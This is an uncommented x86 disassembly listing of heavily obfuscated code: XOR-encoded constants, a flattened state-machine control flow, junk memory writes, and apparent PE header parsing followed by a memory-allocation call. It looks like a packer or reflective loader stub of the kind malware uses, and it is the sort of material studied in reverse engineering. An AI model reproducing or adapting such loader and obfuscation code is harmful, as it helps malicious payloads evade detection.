  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
